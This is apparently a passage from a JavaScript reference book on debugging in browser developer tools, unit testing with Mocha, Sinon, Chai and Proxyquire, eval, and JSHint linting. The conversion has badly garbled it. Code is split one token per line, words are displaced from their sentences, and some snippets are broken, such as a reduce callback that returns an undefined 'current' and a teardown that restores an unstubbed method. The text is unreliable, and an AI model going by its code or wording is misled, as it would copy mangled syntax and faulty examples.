<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Note that these only work in the developer tools of certain browsers.
&dollar;&lowbar; gives you the value of whatever expression was evaluated last.
&quot;foo&quot;
// <i>&quot;foo&quot;*
&dollar;&lowbar;
// <i>&quot;foo&quot;*
<b>&lt;div</b> id                           =     &quot;foo&quot;
&dollar;0 refers to the DOM element currently selected in the Inspector. So
if <b>&gt;</b> is highlighted:
&dollar;0
// <i>&lt;div id=&quot;foo&quot;&gt;*
&dollar;0.
getAttribute
(
&apos;id&apos;
)
// <i>&quot;foo&quot;*
&dollar;1 refers to the element previously selected, &dollar;2 to the one selected
before that, and so forth for &dollar;3 and &dollar;4.
&dollar;&dollar;         (      selector
To get a collection of elements matching a CSS selector, use ). This
is essentially a shortcut for
document.querySelectorAll.
<b>var</b> images = &dollar;&dollar;(&apos;img&apos;); // <i>Returns an array or a nodelist of
all matching elements*
<b>&dollar;&lowbar; &dollar;()</b>¹ <b>&dollar;&dollar;() &dollar;0 &dollar;1 &dollar;2 &dollar;3 &dollar;4</b>
Opera 15+ 11+ 11+ 11+ 11+ 15+ 15+ 15+
Chrome 22+ ✔ ✔ ✔ ✔ ✔ ✔ ✔
Firefox 39+ ✔ ✔ ✔ × × × ×
IE 11 11 11 11 11 11 11 11
Safari 6.1+ 4+ 4+ 4+ 4+ 4+ 4+ 4+
document.getElementById            or   document.querySelector
¹ alias to either
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch99-2">Section 99.2: Breakpoints</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Breakpoints pause your program once execution reaches a certain point.
You can then step through the program line by line, observing its
execution and inspecting the contents of your variables.
There are three ways of creating breakpoints.
debugger
1.  From code, using the ; statement.
2.  From the browser, using the Developer Tools.
3.  From an Integrated Development Environment (IDE).
<b>Debugger Statement</b>
debugger
You can place a ; statement anywhere in your JavaScript code. Once the
JS interpreter reaches that line, it will stop the script execution,
allowing you to inspect variables and step through your code.
<b>Developer Tools</b>
The second option is to add a breakpoint directly into the code from
the browser&apos;s Developer Tools.
<b>Opening the Developer Tools</b>
<b>Chrome or Firefox</b>
1.  Press F12 to open Developer Tools
2.  Switch to the Sources tab (Chrome) or Debugger tab (Firefox)
3.  Press Ctrl + P and type the name of your JavaScript file
Enter
4.  Press to open it.
<b>Internet Explorer or Edge</b>
1.  Press F12 to open Developer Tools
2.  Switch to the Debugger tab.
3.  Use the folder icon near the upper-left corner of the window to open
    a file-selection pane; you can find your JavaScript file there.
<b>Safari</b>
1.  Press Command + Option + C to open Developer Tools
2.  Switch to the Resources tab
3.  Open the &quot;Scripts&quot; folder in the left-side panel
4.  Select your JavaScript file.
<b>Adding a breakpoint from the Developer Tools</b>
Once you have your JavaScript file open in Developer Tools, you can
click a line number to place a breakpoint. The next time your program
runs, it will pause there.
<b>Note about Minified Sources:</b> If your source is minified, you can
Pretty Print it (convert to readable format). In Chrome, this is done
by clicking on the {} button in the bottom right corner of the source
code viewer.
<b>IDEs</b>
<b>Visual Studio Code (VSC)</b>
VSC has [built-in
support](https://code.visualstudio.com/docs/editor/debugging) for
debugging JavaScript.
1.  Click the Debug button on the left or Ctrl + Shift + D
launch.json
2.  If not already done, create a launch configuration file () by
    pressing the gear icon.
3.  Run the code from VSC by pressing the green play button or hit F5 .
<b>Adding a breakpoint in VSC</b>
Click next to the line number in your JavaScript source file to add a
breakpoint (it will be marked red). To delete the breakpoint, click
the red circle again.
<b>Tip:</b> You can also utilise the conditional breakpoints in
browser&apos;s dev tools. These help in skipping unnecessary breaks in
execution. Example scenario: you want to examine a variable in a loop
exactly at 5th iteration.
![](./images/image047.jpg){width="4.288194444444445in"
height="0.8736111111111111in"}
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch99-3">Section 99.3: Using setters and getters to find what changed a property</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Let&apos;s say you have an object like this:
<b>var</b>
myObject
=
{
name
:
&apos;Peter&apos;
}
myObject.name
Later in your code, you try to access and you get <b>George</b> instead
of <b>Peter</b>. You start wondering who changed it and where exactly it
was changed. There is a way to place a debugger (or something else) on
every set
myObject.name                        =   &apos;something&apos;
(every time someone does ):
<b>var</b>
myObject
=
{
&lowbar;name
:
&apos;Peter&apos;
,
<b>set</b>
name
(
name
)
{
debugger
;
<b>this</b>
.&lowbar;name
=
name
}
,
<b>get</b>
name
(
)
{
<b>return</b>
<b>this</b>
.&lowbar;name
}
}
Note that we renamed name to &lowbar;name and we are going to define a
setter and a getter for name.
<b>set</b>   is the setter. That is a sweet spot where you can   console.trace
name      place debugger,                                     
<b>get</b> name
(), or anything else you need for debugging. The setter will set the
value for name in &lowbar;name. The getter (the part) will read the value
from there. Now we have a fully functional object with debugging
functionality.
Most of the time, though, the object that gets changed is not under
our control. Fortunately, we can define setters and getters on
<b>existing</b> objects to debug them.
// <i>First, save the name to &lowbar;name, because we are going to use name for
setter/getter*
otherObject.&lowbar;name
=
otherObject.
name
;
// <i>Create setter and getter*
Object
.
defineProperty
(
otherObject
,
&quot;name&quot;
,
{
<b>set</b>
:
<b>function</b>
(
name
)
{
debugger
;
<b>this</b>
.&lowbar;name
=
name
}
,
<b>get</b>
:
<b>function</b>
(
)
{
<b>return</b>
<b>this</b>
.&lowbar;name
}
}
)
;
Check out
[setters](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/set)
and
[getters](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/get)
at MDN for more information.
Browser support for setters/getters:
<b>Chrome Firefox IE Opera Safari Mobile</b>
Version 1 2.0 9 9.5 3 all
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch99-4">Section 99.4: Using the console</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
In many environments, you have access to a global console object that
contains some basic methods for communicating with standard output
devices. Most commonly, this will be the browser&apos;s JavaScript console
(see
[Chrome](https://developers.google.com/web/tools/chrome-devtools/debug/console/?utm_source=dcc),
[Firefox](https://developer.mozilla.org/en-US/docs/Tools/Browser_Console),
[Safari](https://developer.apple.com/safari/tools/), and
[Edge](https://developer.microsoft.com/en-us/microsoft-edge/platform/documentation/f12-devtools-guide/console/)
for more information).
// <i>At its simplest, you can &apos;log&apos; a string</i>
console.
log
(
&quot;Hello, World!&quot;
)
;
// <i>You can also log any number of comma-separated values</i>
console.
log
(
&quot;Hello&quot;
,
&quot;World!&quot;
)
;
// <i>You can also use string substitution</i>
console.
log
(
&quot;%s %s&quot;
,
&quot;Hello&quot;
,
&quot;World!&quot;
)
;
// <i>You can also log any variable that exist in the same scope*
<b>var</b>
arr
=
&lbrack;
1
,
2
,
3
&rbrack;
;
console.
log
(
arr.
length
,
<b>this</b>
)
;
You can use different console methods to highlight your output in
different ways. Other methods are also useful for more advanced
debugging.
For more documentation, information on compatibility, and instructions
on how to open your browser&apos;s console, see the Console topic.
console.log
Note: if you need to support IE9, either remove or wrap its calls as
follows, because console is undefined until the Developer Tools are
opened:
<b>if</b>
(
console
)
{
// <i>IE9 workaround*
console.
log
(
&quot;test&quot;
)
;
}
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch99-5">Section 99.5: Automatically pausing execution</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
In Google Chrome, you can pause execution without needing to place
breakpoints.
![](./images/image048.jpg){width="0.225in" height="0.225in"}
<b>Pause on Exception:</b> While this button is toggled on, if your
program hits an unhandled exception, the program will pause as if it
had hit a breakpoint. The button can be found near Execution Controls
and is useful for locating errors.
You can also pause execution when an HTML tag (DOM node) is modified,
or when its attributes are changed. To do that, right click the DOM
node on the Elements tab and select &quot;Break on&hellip;&quot;.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch99-6">Section 99.6: Elements inspector</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Clicking the
![](./images/image049.jpg){width="0.21597222222222223in"
height="0.21597222222222223in"} *Select an element in the page to
inspect it* button in the upper left corner of the Elements tab in
Chrome or Inspector tab in Firefox, available from Developer Tools,
and then clicking on an element of the page highlights the element and
assigns it to the &dollar;0 variable.
Elements inspector can be used in variety of ways, for example:
1.  You can check if your JS is manipulating DOM the way you expect it
    to,
2.  You can more easily debug your CSS, when seeing which rules affect
    the element (*Styles* tab in Chrome)
3.  You can play around with CSS and HTML without reloading the page.
Also, Chrome remembers last 5 selections in the Elements tab. &dollar;0 is
the current selection, while &dollar;1 is the previous selection. You can go
up to &dollar;4. That way you can easily debug multiple nodes without
constantly switching selection to them.
You can read more at [Google
Developers](https://developers.google.com/web/tools/chrome-devtools/debug/command-line/command-line-reference#section-1).
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch99-7">Section 99.7: Break when a function is called</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
For named (non-anonymous) functions, you can break when the function
is executed.
debug
(
functionName
)
;
The next time functionName function runs, the debugger will stop on
its first line.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch99-8">Section 99.8: Stepping through code</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Once you&apos;ve paused execution on a breakpoint, you may want to follow
execution line-by-line to observe what happens. Open your browser&apos;s
Developer Tools and look for the Execution Control icons. (This
example uses the icons in Google Chrome, but they&apos;ll be similar in
other browsers.)
![](./images/image050.jpg){width="0.21597222222222223in"
height="0.19791666666666666in"} <b>Resume:</b> Unpause execution.
Shorcut: F8 (Chrome, Firefox)
F6
![](./images/image051.jpg){width="0.2611111111111111in"
height="0.18888888888888888in"} <b>Step Over:</b> Run the next line of
code. If that line contains a function call, run the whole function
and move to the next line, rather than jumping to wherever the
function is defined. Shortcut : F10 (Chrome, Firefox, IE/Edge),
(Safari)
![](./images/image052.jpg){width="0.19791666666666666in"
height="0.20694444444444443in"} <b>Step Into:</b> Run the next line of
code. If that line contains a function call, jump into the function
and pause there. Shortcut : F11 (Chrome, Firefox, IE/Edge), F7
(Safari)
![](./images/image053.jpg){width="0.19791666666666666in"
height="0.20694444444444443in"} <b>Step Out:</b> Run the rest of the
current function, jump back to where the function was called from, and
pause at the next statement there. Shortcut : Shift + F11 (Chrome,
Firefox, IE/Edge), F8 (Safari)
Use these in conjunction with the <b>Call Stack</b>, which will tell you
which function you&apos;re currently inside of, which function called that
function, and so forth.
See Google&apos;s guide on [&quot;How to Step Through the
Code&quot;](https://developers.google.com/web/tools/chrome-devtools/debug/breakpoints/step-code?hl=en)
for more details and advice.
Links to browser shortcut key documentation:
[Chrome](https://developers.google.com/web/tools/chrome-devtools/iterate/inspect-styles/shortcuts?hl=en#keyboard-shortcuts-by-panel)
[Firefox](https://developer.mozilla.org/en-US/docs/Tools/Debugger/Keyboard_shortcuts)
[IE](https://msdn.microsoft.com/en-us/library/dd565630(v=vs.85).aspx#debugMode)
[Edge](https://developer.microsoft.com/en-us/microsoft-edge/platform/documentation/f12-devtools-guide/developer-tools-keyboard-shortcuts/)
[Safari](https://developer.apple.com/library/mac/documentation/AppleApplications/Conceptual/Safari_Developer_Guide/KeyboardShortcuts/KeyboardShortcuts.html)
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch100">Chapter 100: Unit Testing JavaScript</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch100-1">Section 100.1: Unit Testing Promises with Mocha, Sinon, Chai and Proxyquire</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Here we have a simple class to be tested that returns a Promise based
on the results of an external ResponseProcessor that takes time to
execute.
For simplicity we&apos;ll assume that the processResponse method won&apos;t
ever fail.
import
{
processResponse
}
from
&apos;../utils/response_processor&apos;
;
<b>const</b>
ping
=
(
)
=&gt;
{
<b>return</b>
<b>new</b>
Promise
(
(
resolve
,
&lowbar;reject
)
=&gt;
{
<b>const</b>
response
=
processResponse
(
data
)
;
resolve
(
response
)
;
}
)
;
}
module.
exports
=
ping
;
To test this we can leverage the following tools.
1.  [mocha](https://mochajs.org/)
2.  [chai](http://chaijs.com/)
3.  [sinon](http://sinonjs.org/)
4.  [proxyquire](https://github.com/thlorenz/proxyquire)
[chai](https://github.com/domenic/chai-as-promised)   [-](https://github.com/domenic/chai-as-promised)   [as](https://github.com/domenic/chai-as-promised)   [-](https://github.com/domenic/chai-as-promised)   [promised](https://github.com/domenic/chai-as-promised)
5&period;
package.json
I use the following test script in my file.

&quot;test&quot;: &quot;NODE_ENV=test mocha &bsol;compilers js:babel-core/register
&bsol;require

./test/unit/test_helper.js &bsol;recursive test/&ast;&ast;/&ast;&lowbar;spec.js&quot;

This allows me to use es6 syntax. It references a test_helper that
will look like
import
chai from
&apos;chai&apos;
;
import
sinon from
&apos;sinon&apos;
;
import
sinonChai from
&apos;sinon-chai&apos;
;
import
chaiAsPromised from
&apos;chai-as-promised&apos;
;
import
sinonStubPromise from
&apos;sinon-stub-promise&apos;
;
chai.
use
(
sinonChai
)
;
chai.
use
(
chaiAsPromised
)
;
sinonStubPromise
(
sinon
)
;
chai  &minus;  as  &minus;  promised
ping
Proxyquire allows us to inject our own stub in the place of the
external ResponseProcessor. We can then use sinon to spy on that
stub&apos;s methods. We use the extensions to chai that injects to check
that the () method&apos;s promise is fullfilled, and that it eventually
returns the required response.
import
{
expect
}
from
&apos;chai&apos;
;
import
sinon from
&apos;sinon&apos;
;
import
proxyquire from
&apos;proxyquire&apos;
;
<b>let</b>
formattingStub
=
{
wrapResponse
:
(
)
=&gt;
{
}
}
<b>let</b>
ping
=
proxyquire
(
&apos;../../../src/api/ping&apos;
,
{
&apos;../utils/formatting&apos;
:
formattingStub
}
)
;
describe
(
&apos;ping&apos;
,
(
)
=&gt;
{
<b>let</b>
wrapResponseSpy
,
pingResult
;
<b>const</b>
response
=
&apos;some response&apos;
;
beforeEach
(
(
)
=&gt;
{
wrapResponseSpy
=
sinon.
stub
(
formattingStub
,
&apos;wrapResponse&apos;
)
.
returns
(
response
)
;
pingResult
=
ping
(
)
;
}
)
afterEach
(
(
)
=&gt;
{
formattingStub.
wrapResponse
.
restore
(
)
;
}
)
it
(
&apos;returns a fullfilled promise&apos;
,
(
)
=&gt;
{
expect
(
pingResult
)
.
to
.
be
.
fulfilled
;
}
)
it
(
&apos;eventually returns the correct response&apos;
,
(
)
=&gt;
{
expect
(
pingResult
)
.
to
.
eventually
.
equal
(
response
)
;
}
)
}
)
;
Now instead let&apos;s assume you wish to test something that uses the
response from ping.
import
{
ping
}
from
&apos;./ping&apos;
;
<b>const</b>
pingWrapper
=
(
)
=&gt;
{
ping.
then
(
(
response
)
=&gt;
{
// <i>do something with the response*
}
)
;
}
module.
exports
=
pingWrapper
;
To test the
pingWrapper
we leverage
1.  [sinon](http://sinonjs.org/)
2.  [proxyquire](https://github.com/thlorenz/proxyquire)
[sinon](https://github.com/substantial/sinon-stub-promise) 
[-](https://github.com/substantial/sinon-stub-promise) 
[stub](https://github.com/substantial/sinon-stub-promise) 
[-](https://github.com/substantial/sinon-stub-promise)
[promise](https://github.com/substantial/sinon-stub-promise)
3&period;
sinon   &minus;  stub
As before, Proxyquire allows us to inject our own stub in the place of
the external dependency, in this case the ping method we tested
previously. We can then use sinon to spy on that stub&apos;s methods and
leverage promise to allow us to returnsPromise. This promise can then
be resolved or rejected as we wish in the test, in order to test the
wrapper&apos;s response to that.
import
{
expect
}
from
&apos;chai&apos;
;
import
sinon from
&apos;sinon&apos;
;
import
proxyquire from
&apos;proxyquire&apos;
;
<b>let</b>
pingStub
=
{
ping
:
(
)
=&gt;
{
}
}
;
<b>let</b>
pingWrapper
=
proxyquire
(
&apos;../src/pingWrapper&apos;
,
{
&apos;./ping&apos;
:
pingStub
}
)
;
describe
(
&apos;pingWrapper&apos;
,
(
)
=&gt;
{
<b>let</b>
pingSpy
;
<b>const</b>
response
=
&apos;some response&apos;
;
beforeEach
(
(
)
=&gt;
{
pingSpy
=
sinon.
stub
(
pingStub
,
&apos;ping&apos;
)
.
returnsPromise
(
)
;
pingSpy.
resolves
(
response
)
;
pingWrapper
(
)
;
}
)
;
afterEach
(
(
)
=&gt;
{
pingStub.
wrapResponse
.
restore
(
)
;
}
)
;
it
(
&apos;wraps the ping&apos;
,
(
)
=&gt;
{
expect
(
pingSpy
)
.
to
.
have
.
been
.
calledWith
(
response
)
;
}
)
;
}
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch100-2">Section 100.2: Basic Assertion</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
At its most basic level, Unit Testing in any language provides
assertions against some known or expected output.
<b>function</b>
assert
(
outcome
,
description
)
{
<b>var</b>
passFail
=
outcome
?
&apos;pass&apos;
:
&apos;fail&apos;
;
console.
log
(
passFail
,
&apos;: &apos;
,
description
)
;
<b>return</b>
outcome
;
}
;
The popular assertion method above shows us one quick and easy way to
assert a value in most web browsers and interpreters like Node.js with
virtually any version of ECMAScript.
A good unit test is designed to test a discreet unit of code; usually
a function.
<b>function</b>
add
(
num1
,
num2
)
{
<b>return</b>
num1
&plus;
num2
;
}
<b>var</b>
result
=
add
(
5
,
20
)
;
assert
(
result
==
24
,
&apos;add(5, 20) should return 25&hellip;&apos;
)
;
In the example above, the return value from the function
add
(
x
,
y
)
or
5
&plus;
20
is clearly
25
, so our assertion of
24
should fail, and the assert method will log a &quot;fail&quot; line.
If we simply modify our expected assertion outcome, the test will
succeed and the resulting output would look something like this.
assert
(
result
==
25
,
&apos;add(5, 20) should return 25&hellip;&apos;
)
;
console output
:
&gt;
pass
:
should
<b>return</b>
25
&hellip;
This simple assertion can assure that in many different cases, your
&quot;add&quot; function will always return the expected result and requires
no additional frameworks or libraries to work.
<b>var</b> result   =   add
A more rigorous set of assertions would look like this (using (x,y)
for each assertion):
assert( result == 0, &apos;add(0, 0) should return 0&hellip;&apos;); assert( result
== -1, &apos;add(0, -1) should return -1&hellip;&apos;); assert( result == 1,
&apos;add(0, 1) should return 1&hellip;&apos;); And console output would be this:
&gt;
pass
:
should
<b>return</b>
0
&hellip;
&gt;
pass
:
should
<b>return</b>
&minus;
1
&hellip;
&gt;
pass
:
should
<b>return</b>
1
&hellip;
<b>add</b>
We can now safely say that <b>(x,y)</b>... <b>should return the sum of two
integers</b>. We can roll these up into something like this:
<b>function</b>
test&lowbar;&lowbar;addsIntegers
(
)
{
// <i>expect a number of passed assertions*
<b>var</b>
passed
=
3
;
// <i>number of assertions to be reduced and added as Booleans*
<b>var</b>
assertions
=
&lbrack;
assert
(
add
(
0
,
0
)
==
0
,
&apos;add(0, 0) should return 0&hellip;&apos;
)
,
assert
(
add
(
0
,
&minus;
1
)
==
&minus;
1
,
&apos;add(0, -1) should return -1&hellip;&apos;
)
,
assert
(
add
(
0
,
1
)
==
1
,
&apos;add(0, 1) should return 1&hellip;&apos;
)
&rbrack;
.
reduce
(
<b>function</b>
(
previousValue
,
currentValue
)
{
<b>return</b>
previousValue
&plus;
current
;
}
)
;
<b>if</b>
(
assertions
===
passed
)
{
console.
log
(
&quot;add(x,y)&hellip; did return the sum of two integers&quot;
)
;
<b>return</b>
<b>true</b>
;
}
<b>else</b>
{
console.
log
(
&quot;add(x,y)&hellip; does not reliably return the sum of two integers&quot;
)
;
<b>return</b>
<b>false</b>
;
}
}
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch101">Chapter 101: Evaluating JavaScript</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
<b>Parameter Details</b>
string The JavaScript to be evaluated.
eval   (  &apos;2 + 2&apos;
In JavaScript, the eval function evaluates a string as if it were
JavaScript code. The return value is the result of the evaluated
string, e.g. ) returns 4.

eval is available in the global scope. The lexical scope of the
evaluation is the local scope unless invoked indirectly
<b>var</b> geval    =  eval  ;   geval
(e.g. (s);).
<b>The use of eval is strongly discouraged.</b> See the Remarks section for
details.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch101-1">Section 101.1: Evaluate a string of JavaScript statements</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
<b>var</b>
x
=
5
;
<b>var</b>
str
=
&quot;if (x == 5) {console.log(&apos;z is 42&apos;); z = 42;} else z = 0; &quot;
;
console.
log
(
&quot;z is &quot;
,
eval
(
str
)
)
;
<b>The use of eval is strongly discouraged.</b> See the Remarks section
for details.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch101-2">Section 101.2: Introduction</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
You can always run JavaScript from inside itself, although this is
<b>strongly discouraged</b> due to the security vulnerabilities it
presents (see Remarks for details).
To run JavaScript from inside JavaScript, simply use the below
function:
eval
(
&quot;var a = &apos;Hello, World!&apos;&quot;
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch101-3">Section 101.3: Evaluation and Math</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
eval
You can set a variable to something with the () function by using
something similar to the below code:
<b>var</b>
x
=
10
;
<b>var</b>
y
=
20
;
<b>var</b>
a
=
eval
(
&quot;x &ast; y&quot;
)
&plus;
&quot;&lt;br&gt;&quot;
;
<b>var</b>
b
=
eval
(
&quot;2 + 2&quot;
)
&plus;
&quot;&lt;br&gt;&quot;
;
<b>var</b>
c
=
eval
(
&quot;x + 17&quot;
)
&plus;
&quot;&lt;br&gt;&quot;
;
<b>var</b>
res
=
a
&plus;
b
&plus;
c
;
The result, stored in the variable
res
, will be:
200
4
27
<b>The use of eval is strongly discouraged.</b> See the Remarks section
for details.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch102">Chapter 102: Linters - Ensuring code quality</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch102-1">Section 102.1: JSHint</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
[JSHint](http://jshint.com/) is an open source tool which detects
errors and potential problems in JavaScript code.
To lint your JavaScript you have two options.
1.  Go to [JSHint.com](http://jshint.com/) and paste your code in there
    on line text editor.
2.  Install [JSHint in your IDE](http://jshint.com/install/).
Atom: [linter-jshint](https://github.com/AtomLinter/linter-jshint)
(must have [Linter](https://github.com/steelbrain/linter) plugin
installed)
Sublime Text: [JSHint
Gutter](https://github.com/victorporof/Sublime-JSHint) and/or [Sublime
Linter](https://github.com/SublimeLinter/SublimeLinter-for-ST2)
Vim: [jshint.vim](https://github.com/walm/jshint.vim) or
[jshint2.vim](https://github.com/Shutnik/jshint2.vim)
Visual Studio: [VSCode
JSHint](https://github.com/Microsoft/vscode-jshint)
jshintrc
A benefit of adding it to your IDE is that you can create a JSON
configuration file named . that will be used when linting your
program. This is convent if you want to share configurations between
projects.
jshintrc
Example . file
{
&quot;-W097&quot;
:
<b>false</b>
,
// <i>Allow &quot;use strict&quot; at document level*
&quot;browser&quot;
:
<b>true</b>
,
// <i>defines globals exposed by modern browsers*
*http://jshint.com/docs/options/#browser*
&quot;curly&quot;
:
<b>true</b>
,
// <i>requires you to always put curly braces around blocks in loops and*
*conditionals http://jshint.com/docs/options/#curly*
&quot;devel&quot;
:
<b>true</b>
,
// <i>defines globals that are usually used for logging poor-man&apos;s
debugging:*
*console, alert, etc. http://jshint.com/docs/options/#devel*
// <i>List global variables (false means read only)*
&quot;globals&quot;
:
{
&quot;globalVar&quot;
:
<b>true</b>
}
,
&quot;jquery&quot;
:
<b>true</b>
,
// <i>This option defines globals exposed by the jQuery JavaScript
library.*
&quot;newcap&quot;
:
<b>false</b>
,
// <i>List any global functions or const vars*
&quot;predef&quot;
:
&lbrack;
&quot;GlobalFunction&quot;
,
&quot;GlobalFunction2&quot;
&rbrack;
,
&quot;undef&quot;
:
<b>true</b>
,
// <i>warn about undefined vars*
&quot;unused&quot;
:
<b>true</b>
// <i>warn about unused vars*
}
JSHint also allows configurations for specific lines/blocks of code
<b>switch</b>
(
operation
)
{
<b>case</b>
&apos;+&apos;
{
result
=
a
&plus;
b
;
<b>break</b>
;
}
// <i>JSHint W086 Expected a &apos;break&apos; statement*
// <i>JSHint flag to allow cases to not need a break*
<i>/&ast; falls through &ast;/*
<b>case</b>
&apos;&ast;&apos;
:
<b>case</b>
&apos;x&apos;
:
{
result
=
a
&ast;
b
;
<b>break</b>
;
}
}
// <i>JSHint disable error for variable not defined, because it is defined
in another file*
<i>/&ast; jshint -W117 &ast;/*
globalVariable
=
&apos;in-another-file.js&apos;
;
<i>/&ast; jshint +W117 &ast;/*
More configuration options are documented at
<http://jshint.com/docs/options/>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch102-2">Section 102.2: ESLint / JSCS</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
[ESLint](http://eslint.org/) is a code style linter and formatter for
your style guide [much like
JSHint](http://www.slant.co/versus/8627/8628/%7Ejshint_vs_eslint).
ESLint merged with
[JSCS](https://medium.com/@markelog/jscs-end-of-the-line-bc9bf0b3fdb2#.h2cktyall)
in April of 2016. ESLint does take more effort to set up than JSHint,
but there are clear instructions on their
